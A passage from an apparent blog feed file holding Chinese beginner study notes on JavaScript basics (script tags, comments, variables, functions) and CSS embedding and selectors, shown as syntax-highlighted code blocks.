class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/1.js&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//alert(&quot;hello world!~~~~~&quot;); // 这里的代码不会执行！</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 单独的脚本块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello world!%%%%%%%%&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="文件代码"><a href="#文件代码" class="headerlink" title="文件代码"></a>文件代码</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 这是一堆JS代码，这些JS代码在HTML引入的时候，遵循自上而下的顺序依次逐行执行的！ */</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;hello kitty&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="关于各种注释"><a href="#关于各种注释" class="headerlink" title="关于各种注释"></a>关于各种注释</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>关于各种注释<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* CSS的注释 */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这是HTML的注释 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* 这是javascript注释，多行 */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 这是javascript注释,单行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="标识符和关键字"><a href="#标识符和关键字" class="headerlink" title="标识符和关键字"></a>标识符和关键字</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>标识符和关键字<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* 标识符命名规则和命名规范按照java那一套来就行！ */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">以下这段代码是JS的for循环，找出其中的关键字和标识符？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">关键字：var、for</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符：i、alert</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符命名规则：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符只能由数字、字母、下划线、美元符号组成，不能含有其它特殊符号</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符不能以数字开始</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符严格区分大小写</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">关键字不能做标识符</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符理论上没有长度限制</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符命名规范？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">.....</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;i = &quot;</span> + i)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JS的变量<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">回顾Java中的变量？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么声明？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">int i;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">double d;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">String s;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么赋值？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 100;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">d = 3.14;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">s = &quot;abc&quot;;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">一行上能声明多个变量吗？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">int a, b, c = 300;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">a b c都是int类型。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">a和b没有赋值。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">c赋值300</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">重点：Java语言是一种强类型语言，有编译阶段，属于编译型语言。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">Java语言在编译阶段确定变量的数据类型，也就是说程序还没有</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">运行呢，变量的数据类型就已经确定了，并且该变量的数据类型</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">在这一生中，永远不可变。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">int x = 1200;【x = true; java的编译器会报错。不让这样做。语法不对！】</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">double d = x; </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">这行代码表示x的变量中保存的值1200给d变量</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">x变量还是int类型，d变量是double类型。一生不变。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">JS的变量？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么声明？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var 变量名;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var i;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么赋值？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">变量名 = 值;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 100;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">一行上能声明多个变量吗？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var a, b, c = 300;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">声明3个变量，a b c，并且c赋值300，其中a和b变量没有赋值，系统默认赋值undefined</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">undefined 在JS中一个具体的值，这个值就是 undefined</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">重点：JS语言是一种弱类型语言，没有编译阶段，直接浏览器打开解释执行，</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">在JS中声明变量时不需要指定变量的数据类型，程序在运行过程当中，赋什么</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">类型的值，变量就是什么数据类型，并且变量的数据类型是可变的。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var i;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 100; 到这里i是整数型</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = false; 到这里i就是布尔类型了</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = true;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 3.14;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = new Object();</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> i;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(i) <span class="comment">// 变量只声明没有赋值,系统默认赋值undefined, 在JS当中undefined是一个具体存在的值.</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> x = <span class="string">&quot;undefined&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(x) <span class="comment">// &quot;undefined&quot;这个不是undefined,它是一个字符串.</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 声明时,同时赋值</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> k = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(k + <span class="number">1</span>) <span class="comment">// 101</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   k = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(k);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   k = <span class="string">&quot;abc&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(k)</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 一行上可以声明多个变量</span></span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//var是一个关键字,就是用来声明变量的,variables单词的前3个字母.</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> a, b, c = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(a) <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(b) <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(c) <span class="comment">// 100</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>函数初步<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//alert(122222);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">回顾Java中的方法：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">[修饰符列表] 返回值类型 方法名(形式参数列表)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">方法体;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">例如：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">public static int sum(int a,int b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">return a + b;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">JavaScript当中的函数：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">函数定义的语法格式是什么？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">function 函数名(形式参数列表)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">函数体;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">例如：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">function sum(a, b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">return a + b;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">函数名：sum</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">形式参数列表是：a和b  (a和b都是变量名！)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">JS中的函数返回值类型是不需要指定的，因为可以返回任何类型的数据。没有限制。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">关于JS的的调试？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">首选方案是：alert()，在程序的某个位置先使用alert弹出某个变量的值，看看是否是你需要的。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">通过alert可以调试JS代码。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">另外一种方案是：采用浏览器自带的调试插件，F12</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">F12这个插件中比较重要的面板：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">控制台</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">查看器</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">网络</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">掌握以上三个面板！！！！！！！！！！！！</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript">   <span class="comment">/* function sum(a, b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   &#125; */</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 函数必须调用才会执行.</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x, y</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(x + <span class="string">&quot;,&quot;</span> + y);</span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//alert(&quot;sum函数执行了！&quot;);</span></span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//这一切都是因为js是一门弱类型语言!</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="string">&quot;abc&quot;</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>();</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">/* JS的函数还有另一种声明方式？*/</span></span></span><br><span class="line"><span class="language-javascript">   <span class="comment">/* function mysum(a, b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   &#125; */</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//效果相同</span></span></span><br><span class="line"><span class="language-javascript">   mysum = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">return</span> a + b; <span class="comment">//返回计算结果!</span></span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> result = <span class="title function_">mysum</span>(<span class="number">10</span>, <span class="number">20</span>);</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(result)</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//定义一个函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params">username</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(<span class="string">&quot;欢迎&quot;</span> + username + <span class="string">&quot;光临！&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在事件句柄当中调用sayHello函数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;sayHello(&#x27;李四&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS学习笔记</title>
      <link href="/2023/03/07/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/07/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="承接HTML学习笔记"><a href="#承接HTML学习笔记" class="headerlink" title="承接HTML学习笔记"></a>承接HTML学习笔记</h1><p>附上动力节点网课视频</p><h2 id="CSS概述和在HTML中嵌入CSS样式的三种方式"><a href="#CSS概述和在HTML中嵌入CSS样式的三种方式" class="headerlink" title="CSS概述和在HTML中嵌入CSS样式的三种方式"></a>CSS概述和在HTML中嵌入CSS样式的三种方式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS概述<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>什么是CSS？<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span>  CSS:Cascading Style Sheet(层叠样式语言).CSS是一种样式表语言。专门用来修饰HTML页面的。让HTML页面更好看。</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span>  CSS是HTML的化妆品.CSS是离不开HTML的，CSS离开了HTML就没有意义了，所以还是新建HTML文件，编写HTML代码，HTML代码中编写央视，修饰HTML节点。</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>在HTML嵌入CSS样式的第一种方式<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--内联定义--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--盒子--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">内联定义的语法格式：</span></span><br><span class="line"><span class="comment">&lt;标签 style=&quot;样式名：样式值;样式名：样式值&quot;&gt;&lt;/标签&gt;</span></span><br><span class="line"><span class="comment">样式可通过查找帮助文档来获取</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px;background-color: #66FF66;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>在HTML嵌入CSS样式的第二种方式<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--样式块对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 这是CSS的注释*(与HTML不同) */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 设置id=&quot;div2&quot;元素的宽度高度和颜色 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-css">设置某个元素的样式，首先你要选中这个元素，怎么选中一个或多个元素呢？</span></span></span><br><span class="line"><span class="comment"><span class="language-css">常见的选择元素的方式有三种：（这里说的是常见的）</span></span></span><br><span class="line"><span class="comment"><span class="language-css">id选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">标签选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">类选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">*/</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 关于id选择器 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* id选择器只能作用于当前页面的一个节点，因为id是不能重复的 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#div2</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: greenyellow;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 标签选择器 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 作用于当前页面中所有的input元素 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* border-color: red;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">border-style: dashed;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">border-width: 1px; */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 总样式 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">1px</span> solid black;<span class="comment">/* 宽度 样式 颜色 */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* id选择器的优先级比标签选择器高 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#email</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">20px</span> dashed red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 类选择器 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.student</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: <span class="number">#0000FF</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span 